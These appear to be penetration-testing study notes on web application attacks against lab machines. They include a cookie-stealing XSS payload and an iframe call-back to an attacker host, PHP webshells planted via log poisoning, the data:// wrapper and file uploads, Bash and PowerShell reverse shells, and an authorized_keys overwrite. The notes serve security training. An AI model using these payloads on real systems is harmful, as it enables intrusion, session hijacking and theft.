# Web Application Attacks

## Table of Contents
- [WebApp Assessment Tools](#webapp-assessment-tools)
  - [Fingerprinting Web Servers with Nmap](#fingerprinting-web-servers-with-nmap)
  - [Technology Stack Identification with Wappalyzer](#technology-stack-identification-with-wappalyzer)
  - [Directory Brute Force with Gobuster](#directory-brute-force-with-gobuster)
  - [Security Testing with Burp Suite](#security-testing-with-burp-suite)
  - [Nikto](#nikto)
- [WebApp Enumeration](#webapp-enumeration)
  - [Inspecting HTTP Response Headers and Sitemaps](#inspecting-http-response-headers-and-sitemaps)
  - [Enumerating and Abusing APIs](#enumerating-and-abusing-apis)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
  - [Stored vs Reflected XSS Theory](#stored-vs-reflected-xss-theory)
  - [Identifying XSS Vulnerabilities](#identifying-xss-vulnerabilities)
  - [Basic XSS](#basic-xss)
  - [Privilege Escalation via XSS](#privilege-escalation-via-xss)
- [Directory Traversal Vulnerabilities](#directory-traversal-vulnerabilities)
  - [Identifying and Exploiting Directory Traversals](#identifying-and-exploiting-directory-traversals)
  - [Encoding Special Characters](#encoding-special-characters)
- [File Inclusion Vulnerabilities](#file-inclusion-vulnerabilities)
  - [Exploiting Local File Inclusion (LFI)](#exploiting-local-file-inclusion-lfi)
  - [PHP Wrappers](#php-wrappers)
  - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
- [File Upload Vulnerabilities](#file-upload-vulnerabilities)
  - [Using Executable Files](#using-executable-files)
  - [Using Non-Executable Files](#using-non-executable-files)
- [OS Command Injection](#os-command-injection)
- [SQL Injection](#sql-injection)
  - [Identifying SQL Injection Vulnerabilities](#identifying-sql-injection-vulnerabilities)
  - [Authentication Bypass](#authentication-bypass)
  - [Enumerating the Database](#enumerating-the-database)
  - [From SQL Injection to Code Execution](#from-sql-injection-to-code-execution)
- [Escaping WAF filters]



## WebApp Assessment Tools
### Fingerprinting Web Servers with Nmap
We should start web application enumeration from its core component, the web server, since this is the common denominator of any web application that exposes its services.

- Run nmap service scan (**-sV**) to grab the web server (-p80) banner.
    ```sh
    kali@kali:~$ sudo nmap -p80  -sV 192.168.50.20
    ...
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    ```
- Running Nmap NSE http enumeration script against the target
    ```sh
    kali@kali:~$ sudo nmap -p80 --script=http-enum 192.168.50.20
    ...
    PORT   STATE SERVICE
    80/tcp open  http
    | http-enum:
    |   /login.php: Possible admin folder
    |   /db/: BlogWorx Database
    |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    |   /db/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    |   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    |_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    ```
### Technology Stack Identification with Wappalyzer
Along with the active information gathering we performed via Nmap, we can also passively fetch a wealth of information about the application technology stack via [*Wappalyzer*](https://www.wappalyzer.com/).
### Directory Brute Force with Gobuster
Once we have discovered an application running on a web server, our next step is to map all its publicly-accessible files and directories. To do this, we would need to perform multiple queries against the target to discover any hidden paths. [Gobuster](https://www.kali.org/tools/gobuster/) is a tool (written in Go language) that can help us with this sort of enumeration. It uses wordlists to discover directories and files on a server through brute forcing.

Gobuster supports different enumeration modes, including fuzzing and dns, but for now, we'll only rely on the **dir** mode, which enumerates files and directories. We need to specify the target IP using the **-u** parameter and a wordlist with **-w**. The default running threads are 10; we can reduce the amount of traffic by setting a lower number via the **-t** parameter.
```sh
kali@kali:~$ gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -t 5
```
> **Note**:
> Gobuster allows auto-signed certificates (`  -k, --no-tls-validation --> Skip TLS certificate verification`), it doesn't have recursive search.
### Directory Brute Force with Dirsearch
An alternative is [Dirsearch](https://github.com/maurosoria/dirsearch):
```sh
kali@kali:~$ dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,exe,sh,py,html,pl -f -t 20 -u http://10.11.1.10 -r 10
```

- More tools can be found on [HackTricks, Pentesting Web - Brute Force directories and files](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web#brute-force-directories-and-files).
### DIRB
```sh
kali@kali:~$ dirb http://www.megacorpone.com -r -z 10   # non recursive, 10 ms delay btw requests
```
### Security Testing with Burp Suite
```sh
kali@kali:~$ burpsuite
```
> **Note**:
> After our initial launch, we'll first notice a warning that Burp Suite has not been tested on our *Java Runtime Environment* (JRE). Since the Kali team always tests Burp Suite on the Java version shipped with the OS, we can safely ignore this warning. 

- Once it launches, we'll choose *Temporary project* and click *Next*.
- We'll leave *Use Burp defaults* selected and click *Start Burp*.

With the Burp *Proxy* tool, we can intercept any request sent from the browser before it is passed on to the server. We can change almost anything about the request at this point, such as parameter names or form values. We can even add new headers. This lets us test how an application handles unexpected arbitrary input.

By default, Burp Suite enables a proxy listener on **localhost:8080**. This is the host and port that our browser must connect to in order to proxy traffic through Burp Suite.

Beside the Proxy feature, the *Repeater* is another fundamental Burp tool. With the Repeater, we can craft new requests or easily modify the ones in History, resend them, and review the responses. To observe this in action, we can right-click a request from *Proxy* > *HTTP History* and select *Send to Repeater*.

If we click on *Repeater*, we will observe one sub-tab with the request on the left side of the window. We can send multiple requests to Repeater and it will display them using separate tabs. Let's send the request to the server by clicking *Send*.

The last feature we will cover is *Intruder*, but first, we'll need to configure our local Kali's hosts file to statically assign the IP to the website we are going to test.
```sh
kali@kali:~$ cat /etc/hosts 

...
192.168.50.16 offsecwp
```

The [*Intruder*](https://portswigger.net/burp/documentation/desktop/tools/intruder/using) Burp feature, as its name suggests, is designed to automate a variety of attack angles, from the simplest to more complex web application attacks. To learn more about this feature, let's simulate a password brute forcing attack.

Since we are dealing with a new target, we can start a new Burp session and configure the Proxy as we did before. Next, we'll navigate to the target login form from Firefox. Then, we will type "admin" and "test" as respective username and password values, and click *Log in*.

Returning to Burp, we'll navigate to *Proxy* > *HTTP History*, right-click on the POST request to /wp-login.php and select *Send to Intruder*.

We can now select the *Intruder* tab in the upper bar, choose the POST request we want to modify, and move to the *Positions* sub-tab. Knowing that the user admin is correct, we only need to brute force the password field. First, we'll press *Clear* on the right bar so that all fields are cleared. We can then select the value of the pwd key and press the *Add* button on the right.

Moving to the *Payloads* sub-tab, we can *Paste*/*Load* a wordlist into the *Payload Options[Simple list]* area.

With everything ready to start the Intruder attack, let's click on the top right *Start Attack* button.

We can move past the Burp warning about restricted Intruder features, as this won't impact our attack. After we let the attack complete, we can observe that apart from the initial probing request, it performed N requests, one for each entry in the provided wordlist.

#### Using Burp to Brute Force a Login Page
 https://portswigger.net/support/using-burp-to-brute-force-a-login-page
 
### Nikto
```sh
kali@kali:~$ nikto -host=http://www.megacorpone.com -maxtime=30s
```

## WebApp Enumeration
### Inspecting Page Content
The firefox debugger tool (<kbd>Ctrl</kbd><kbd>Shift</kbd><kbd>K</kbd>) display's the page resource content.

### Inspecting HTTP Response Headers and Sitemaps
The *Network* tool used in firefox or Burp Suite.

> **Info**:
> HTTP headers are not always generated solely by the web server. For instance, web proxies actively insert the [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) header to signal the web server about the original client IP address.

Historically, headers that started with "X-" were called non-standard HTTP headers. However, RFC6648 now deprecates the use of "X-" in favor of a clearer naming convention.

The names or values in the response header often reveal additional information about the technology stack used by the application. Some examples of non-standard headers include X-Powered-By, x-amz-cf-id, and X-Aspnet-Version. Further research into these names could reveal additional information.

*Sitemaps* are another important element we should take into consideration when enumerating web applications.

Web applications can include sitemap files to help search engine bots crawl and index their sites. These files also include directives of which URLs *not* to crawl - typically sensitive pages or administrative consoles, which are exactly the sort of pages we are interested in.

Two most common sitemaps are **`robots.txt`** and **`sitemap.xml`**. 
```sh
kali@kali:~$ curl https://www.google.com/robots.txt
```
### Enumerating and Abusing APIs
NOT REALLY TODO

## Cross-Site Scripting (XSS)
### Stored vs Reflected XSS Theory
XSS vulnerabilities can be grouped into two major classes:

- *Stored XSS attacks*, also known as *Persistent XSS*, occur when the exploit payload is stored in a database or otherwise cached by a server. The web application then retrieves this payload and displays it to anyone who visits a vulnerable page. A single Stored XSS vulnerability can therefore attack all site users. Stored XSS vulnerabilities often exist in forum software, especially in comment sections, in product reviews, or wherever user content can be stored and reviewed later.

- *Reflected XSS attacks* usually include the payload in a crafted request or link. The web application takes this value and places it into the page content. This XSS variant only attacks the person submitting the request or visiting the link. Reflected XSS vulnerabilities can often occur in search fields and results, as well as anywhere user input is included in error messages.

Either of these two vulnerability variants can manifest as client- (browser) or server-side; they can also be DOM-based.

- *DOM-based XSS* takes place solely within the page's *Document Object Model* (DOM). While we won't cover too much detail for now, we should know that browsers parse a page's HTML content and then generate an internal DOM representation. This type of XSS occurs when a page's DOM is modified with user-controlled values. DOM-based XSS can be stored or reflected; the key is that DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed.

No matter how the XSS payload is delivered and executed, the injected scripts run under the context of the user visiting the affected page. This means that the user's browser, not the web application, executes the XSS payload. These attacks can be nevertheless significant, with impacts including session hijacking, forced redirection to malicious pages, execution of local applications as that user, or even trojanized web applications.
### Identifying XSS Vulnerabilities
We can find potential entry points for XSS by examining a web application and identifying input fields (eg search fields, blog posts) that accept unsanitized input which is displayed as output in subsequent pages.

Once we identify an entry point, we can input special characters, and observe the output to see if any of the special characters return unfiltered. The most common special characters used for this purpose include:
```
< > ' " { } ;
```

To check if the website is vulnerable we can submitting some of the above mentioned specific characters: double quotes ("), a semicolon (;), "<", and ">". Inspecting the resulting message in the Inspector tool, if we can see that our characters were not removed or encoded then the website is vulnerable to stored XSS.
### Basic XSS
Let's update our input and create a payload that displays a simple Javascript alert. Based on the code we reviewed, we can see that our message is being inserted into an HTML table cell. We don't need any fancy encoding tricks here, just a basic XSS payload like `"<script>alert('XSS')</script>"`. Let's insert that now.

After submitting our payload, refreshing the Feedback page should execute our injected JavaScript.

### Privilege Escalation via XSS
We could leverage our XSS to steal *cookies* and session information if the application uses an insecure session management configuration. If we can steal an authenticated user's cookie, we could masquerade as that user within the target web site.

Websites use cookies to track state2 and information about users. Cookies can be set with several optional flags, including two that are particularly interesting to us as penetration testers:
- The [*Secure*](https://en.wikipedia.org/wiki/Secure_cookie) flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.
- The [*HttpOnly*](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies) flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

We can verify the nature of session cookies by opening the Web Developer Tools, navigating to the *Storage* tab, then clicking on the target WebSite under the *Cookies* menu on the left.

If the available session cookies all support the HttpOnly feature they can't be retrieved using JavaScript through our attack vector. We'll need to find a new angle.

See [How To Craft An XSS Payload To Create An Admin User In WordPress](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/).

### Content Injection
XSS vulnerabilities are often used to deliver client-side attacks as they allow for the redirection of a victim’s browser to a location of the attacker’s choosing. A stealthy alternative to a redirect is to inject an invisible iframe into our XSS payload.
```
<iframe src=http://<our_KALI_IP>/report height=”0” width=”0”></iframe>
```
Once this payload has been submitted, any user that visits the page will connect back to our attack machine. To test this, we can create a Netcat listener on our attack machine on port 80, and refresh the Feedback page.
```
kali@kali:~$ sudo nc -nvlp 80
...
GET /report HTTP/1.1
Host: 10.11.0.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.11.0.22/feedback.php
...
```
We could take this farther and redirect the victim browser to a client-side attack or to an information gathering script.

To do this, we would want to first capture the victim's User-Agent header to help identify the kind of browser they are using. In the above example, we used Netcat because it shows us the full request sent from the browser, including the User-Agent header. The Apache HTTP Server will also capture the User-Agent header by default in **`/var/log/apache2/access.log`**.

### Stealing Cookies and Session Information
We can also use XSS to steal cookies and session information if the application uses an insecure session management configuration. If we can steal an authenticated user's cookie, we could masquerade as that user within the target web site.

1. Implement a cookie stealer XSS payload:
    ```javascript
    <script>new Image().src="http://<KALI_IP>/cool.jpg?output="+document.cookie;</script>
    ```
2. Submit this payload to the application and wait for an authenticated user to access the application so we can steal the `PHPSESSID` cookie.
  ```sh
  kali@kali:~$ sudo nc -nvlp 80
  listening on [any] 80 ...
  connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 53824
  GET /cool.jpg?output=PHPSESSID=ua19spmd8i3t1l9acl9m2tfi76 HTTP/1.1
  Referer: http://127.0.0.1/admin.php
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
  ...
  ```
3. Now that we have the authenticated session ID, we need to set it in our browser. We can use the [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) browser add-on to easily set and manipulate cookies.
![image](https://user-images.githubusercontent.com/48137513/206016732-dd884e21-6582-45e5-b2ff-62d227b5e7cd.png)

## Directory Traversal Vulnerabilities
For a web application to show a specific page, a web server provides the file from the file system. These files can be located in the web root directory or one of it's subdirectories. In Linux systems, the **/var/www/html/** directory is often used as the web root. When a web application displays a page, http://example.com/file.html for example, it will try to access `/var/www/html/file.html`. The http link doesn't contain any part of the path except the filename because the web root also serves as a base directory for a web server. 

If a web application is vulnerable to directory traversal, a user may access files outside of the web root by using relative paths, thus accessing sensitive files like SSH private keys or configuration files.

### Identifying and Exploiting Directory Traversals
A search for directory traversals begins with the examination of URL query strings and form bodies in search of values that appear as file references, including the most common indicator: file extensions in URL query strings.

For example, if we find the following link, we can extract vital information from it.
```
https://example.com/cms/login.php?language=en.html
```

The URL contains a language parameter with an HTML page as its value. In a situation like this, we should try to navigate to the file directly (**https://example.com/cms/en.html**). If we can successfully open it, we can confirm that **en.html** is a file on the server, meaning we can use this parameter to try other file names. We should always examine parameters closely when they use files as a value.

Moreover, the URL contains a directory called **cms**. This is important information indicating that the web application is running in a subdirectory of the web root.

Once we've identified some likely candidates, we can modify these values to attempt to reference files that should be readable by any user on the system, such as **`/etc/passwd`** (or check for private keys in the user home directory **.ssh/id_rsa**) on Linux or **`C:\boot.ini`** (or **C:\Windows\System32\drivers\etc\hosts**) on Windows.

Some useful wordlists for Linux and Windows:
- [File Inclusion Windows](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)
  - Interesting files include:
    - `C:\Windows\system32\config\RegBack\SYSTEM` and `C:\Windows\system32\config\RegBack\SAM`
    - [LFI - Windows Cheatsheet](https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e) 
- [File Inclusion Linux](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt)

> **Info**:
> In general, it is more difficult to leverage a directory traversal vulnerability for system access on Windows than Linux. In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd, check for private keys in their home directory, and use them to access the system via SSH. This vector is not available on Windows and unfortunately, there is no direct equivalent. Additionally, sensitive files are often not easily found on Windows without being able to list the contents of directories. This means to identify files containing sensitive information, we need to closely examine the web application and collect information about the web server, framework, and programming language.


Be on the lookout for Services you have enumerated. For example, if you found FileZilla you may want to poke with `C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml` (and the associated variations).

For example, if we learn that a target system is running the *Internet Information Services* (IIS) web server, we can research its log paths and web root structure. Reviewing the Microsoft documentation, we learn that the logs are located at **C:\inetpub\logs\LogFiles\W3SVC1\**. Another file we should always check when the target is running an IIS web server is **C:\inetpub\wwwroot\web.config**, which may contain sensitive information like passwords or usernames.

> **Info**:
> In this section, we used the **../** sequence for directory traversal on Linux. As shown, Windows uses backslashes instead of forward slashes for file paths. Therefore, **..\** is an important alternative to **../** on Windows targets.

Ref: [File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion#windows)

### Encoding Special Characters
Because leveraging **../** is a known way to abuse web application behavior, this sequence is often filtered by either the web server, [web application firewalls](), or the web application itself.

> You could check for WAF presence using [HackTricks - Check if any WAF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web#check-if-any-waf).

Fortunately for us, we can use *URL Encoding* (*Percent Encoding*), to potentially bypass these filters. We can leverage specific ASCII encoding lists to manually encode our query or use the online converter on the same page. As a starter you can begin by only encoding the dots, which are represented as "%2e".
## File Inclusion Vulnerabilities
- **Local file inclusions (LFI)** occur when the included file is loaded from the same web server. 
- **Remote file inclusions (RFI)** occur when a file is loaded from an external source. These vulnerabilities are commonly found in PHP applications but they can occur in other programming languages as well.

The exploitation of these vulnerabilities depends on the programming language the application is written in and the server configuration. In the case of PHP, the version of the language runtime and web server configurations, specifically **`php.ini`** values such as *register_globals* and *allow_url* wrappers, make a considerable difference in how these vulnerabilities can be exploited.

> The `php.ini` file on the Windows 10 lab machine can be found at **`C:\xampp\php\php.ini`**. Before making any changes to this file, consider making a backup.

### Exploiting Local File Inclusion (LFI)
Look at the source code of the vulnerable php to clarify what we are dealing with:
```php
37  <?php
38      $file = $_GET["file"];
39      include $file; ?>
```
The application reads in the file parameter from the request query string and then uses that value with an [`include`](https://www.php.net/manual/en/function.include.php) statement. This means that the application will execute any PHP code within the specified file. If the application opened the file with `fread` and used `echo` to display the contents, any code in the file would be displayed instead of executed.

We might be able to push this vulnerability to remote code execution if we can somehow write PHP code to a local file. 
#### Contaminating Log Files
One way we can try to inject code onto the server is through **log file poisoning**. Most application servers will log all URLs that are requested. We can use this to our advantage by submitting a request that includes PHP code. Once the request is logged, we can use the log file in our LFI payload.

- Use Netcat to send a PHP payload:
    ```sh
    kali@kali:~$ nc -nv 10.11.0.22 80
    (UNKNOWN) [10.11.0.22] 80 (http) open
    <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

    HTTP/1.1 400 Bad Request
    ```
- Use the LFI vulnerability to include the Apache **`access.log`** file that contains our PHP payload. We know the application is using an *include* statement so the contents of the included file will be executed as PHP code.
    ```url
    http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
    ```

Thanks to the application's PHP *include* statement, the contents of the contaminated `access.log` file were executed by the web page.

The PHP engine in turn runs the `<?php echo shell_exec($_GET[‘cmd’]);?>` portion of the log file's text (our payload) with the cmd variable's value of "ipconfig", essentially running ipconfig on the target and displaying the output. The additional lines in the log file are simply displayed because they do not contain valid PHP code.

> **Info**:
> Another way to perform this kind of attacks and "automate" the procedure is to use Burp's *Repeater* feature. And if, for example, the User Agent is present in the logs we can modify the User Agent field using Burp to contain `<?php echo system($_GET['cmd']); ?>`. And the make some requests like the ones shown above.

We have achieved command execution on the target system and can leverage this to get a reverse shell or add our SSH key to the authorized_keys file for a user.

Let's attempt to obtain a reverse shell by adding a command to the cmd parameter. We can use a common Bash TCP reverse shell one-liner.8 The target IP for the reverse shell may need to be updated in the labs.
```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```
Since we'll execute our command through the PHP system function, we should be aware that the command may be executed via the *Bourne Shell* (sh), rather than Bash. The previous reverse shell one-liner contains syntax that is not supported by the Bourne Shell. To ensure the reverse shell is executed via Bash, we need to modify the reverse shell command. We can do this by providing the reverse shell one-liner as argument to bash -c, which executes a command with Bash.
```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
We'll once again encode the special characters with URL encoding.
```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

> **Note**:
> When we use Log Poisoning on Windows, we should understand that the log files are located in application-specific paths. For example, on a target running XAMPP, the Apache logs can be found in **C:\xampp\apache\logs\**.

### PHP Wrappers
PHP offers a variety of protocol wrappers to enhance the language's capabilities. For example, PHP wrappers can be used to represent and access local or remote filesystems. We can use these wrappers to bypass filters or obtain code execution via File Inclusion vulnerabilities in PHP web applications. While we'll only examine the [**php://filter**](https://www.php.net/manual/en/wrappers.php.php) and [**data://**](https://www.php.net/manual/en/wrappers.data.php) wrappers, [many are available](https://www.php.net/manual/en/wrappers.php).

- We can use the **php://filter** wrapper to display the contents of files either with or without encodings like *ROT13* or *Base64*. In the previous section, we covered using LFI to include the contents of files. Using **php://filter**, we can also display the contents of executable files such as **.php**, rather than executing them. This allows us to review PHP files for sensitive information and analyze the web application's logic.

```sh
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
# We can assume that something is missing. PHP code will be executed server side and, as such, is not shown.
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
# Same result as before. The PHP code is included and executed via the LFI vulnerability.
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
# Encoding the output with base64 by adding convert.base64-encode, this converts the specified resource to a base64 string. Which we can decode on our terminal and see if there's something hidden.
```

- While the **php://filter** wrapper can be used to include the contents of a file, we can use the **data://** wrapper to achieve code execution. This wrapper is used to embed data elements as plaintext or base64-encoded data in the running web application's code. This offers an alternative method when we cannot poison a local file with PHP code.
  - To use the wrapper, we'll add **data://** followed by the data type and content. In our first example, we will try to embed a small URL-encoded PHP snippet into the web application's code. We can use the same PHP snippet as previously with ls the command.
      ```sh
      kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
      ...
      <a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
      admin.php
      bavarian.php
      css
      ...
      ```
  - When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper.
      ```
      kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64 PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

      kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
      ```

> **Note**:
> he data:// wrapper will not work in a default PHP installation. To exploit it, the *allow_url_include* setting needs to be enabled.

### Remote File Inclusion (RFI)
Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the server must be configured in a very specific way, but they are usually easier to exploit. For example, PHP apps must be configured with **`allow_url_include`** set to "On". Older versions of PHP set this on by default but newer versions default to "Off". If we can force a web application to load a remote file and execute the code, we have more flexibility in creating the exploit payload.

> The `php.ini` file can be found at **`C:\xampp\php\php.ini`** and contains **`allow_url_include`**. 

- Let’s look at an example of an RFI vulnerability. Consider the following:
    ```url
    http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
    ```
- This request would force the PHP webserver to try to include a remote file from our Kali attack machine. We can test this by launching a netcat listener on our Kali machine, then submitting the URL on our Windows 10 target:
    ```
    kali@kali:~$ sudo nc -nvlp 80
    listening on [any] 80 ...
    connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50324
    GET /evil.txt HTTP/1.0
    ```
> Older versions of PHP have a vulnerability in which a null byte (`%00`) will terminate any string. This trick can be used to bypass file extensions added server-side and is useful for file inclusions because it prevents the file extension from being considered as part of the string. In other words, if an application reads in a parameter and appends `.php` to it, a null byte passed in the parameter effectively ends the string without the `.php` extension. This gives an attacker more flexibility in what files can be loaded with the file inclusion vulnerability.
>
> Another trick for RFI payloads is to end them with a question mark (`?`) to mark anything added to the URL server-side as part of the query string.

- There are many types of webshells and Kali includes several in **`/usr/share/webshells`**, written in many common web application programming languages.
- There are some more in **`/usr/share/seclists/Web-Shells`**.

## File Upload Vulnerabilities
Many web applications provide functionality to upload files. In general, we can group File Upload vulnerabilities into three categories:
- Vulnerabilities enabling us to upload files that are executable by the web application. For example, if we can upload a PHP script to a web server where PHP is enabled, we can execute the script by accessing it via the browser or curl.
- Vulnerabilities that require us to combine the file upload mechanism with another vulnerability, such as Directory Traversal. For example, if the web application is vulnerable to Directory Traversal, we can use a relative path in the file upload request and try to overwrite files like **authorized_keys**. Furthermore, we can also combine file upload mechanisms with *XML External Entity* (XXE) or *Cross Site Scripting* (XSS) attacks.
- The third category relies on user interaction. For example, when we discover an upload form for job applications, we can try to upload a CV in *.docx* format with malicious *macros* integrated.
### Using Executable Files
> **Note**:
> We should be aware that the file types of our web shells may be blacklisted via a filter or upload mechanism. In situations like this, we can try to bypass the filter as in this section. However, there are other options to consider. Web applications handling and managing files often enable users to rename or modify files. We could abuse this by uploading a file with an innocent file type like **.txt**, then changing the file back to the original file type of the web shell by renaming it.

Let's use curl to provide dir as a command for the "cmd" parameter of our uploaded web shell.
```
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```

Let's use a [PowerShell one-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) for our reverse shell. Since there are several special characters in the reverse shell one-liner, we will encode the string with base64. We can use PowerShell or an online converter to perform the encoding.

In this demonstration, we'll use PowerShell on our Kali machine to encode the reverse shell one-liner. First, let's create the variable *$Text*, which will be used for storing the reverse shell one-liner as a string. Then, we can use the method [convert](https://docs.microsoft.com/en-us/dotnet/api/system.text.encoding.convert) and the property [*Unicode*](https://docs.microsoft.com/en-us/dotnet/api/system.text.encoding.unicode) from the class [*Encoding*](https://docs.microsoft.com/en-us/dotnet/api/system.text.encoding) to encode the contents of the *$Text* variable.
```sh
kali@kali:~$ pwsh
PowerShell 7.1.3
...

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

PS> exit
```

The *$EncodedText* variable contains the encoded reverse shell one-liner. Let's use **curl** to execute the encoded one-liner via the uploaded **simple-backdoor.pHP**. We can add the base64 encoded string for the powershell command using the **-enc** parameter. We'll also need to use URL encoding for the spaces.
```sh
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

### Using Non-Executable Files
File uploads can have severe consequences even if there is no way for an attacker to execute the uploaded files. We may encounter scenarios where we find an unrestricted file upload mechanism, but cannot exploit it. One example for this is *Google Drive*, where we can upload any file, but cannot leverage it to get system access. In situations such as this, we need to leverage another vulnerability such as Directory Traversal to abuse the file upload mechanism.

If you notice that a Wb Application is missing file name and extensions you can use curl to cehck if the files exist:
```sh
kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
404 page not found
kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
404 page not found
```
> **Info**:
> When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.

We can check if we can upload a file name including a relative path and see the output (eg "Successfully Uploaded File: ../../../../../../../test.txt"). 

Web applications using Apache, Nginx or other dedicated web servers often run with specific users, such as *www-data* on Linux. Traditionally on Windows, the IIS web server runs as a *Network Service* account, a passwordless built-in Windows identity with low privileges. Starting with IIS version 7.5, Microsoft introduced the [IIS Application Pool Identities](https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). These are virtual accounts running web applications grouped by [application pools](https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools). Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications.

When using programming languages that include their own web server, administrators and developers often deploy the web application without any privilege structures by running applications as *root* or *Administrator* to avoid any permissions issues. This means we should always verify whether we can leverage root or administrator privileges in a file upload vulnerability.

Let's try to overwrite the **authorized_keys** file in the home directory for *root*. If this file contains the public key of a private key we control, we can access the system via SSH as the *root* user. 

1. create an SSH keypair with [**ssh-keygen**](https://en.wikipedia.org/wiki/Ssh-keygen), as well as a file with the name **authorized_keys** containing the previously created public key.
    ```sh
    kali@kali:~$ ssh-keygen
    ...
    Your identification has been saved in fileup
    Your public key has been saved in fileup.pub
    ...

    kali@kali:~$ cat fileup.pub > authorized_keys
    ```
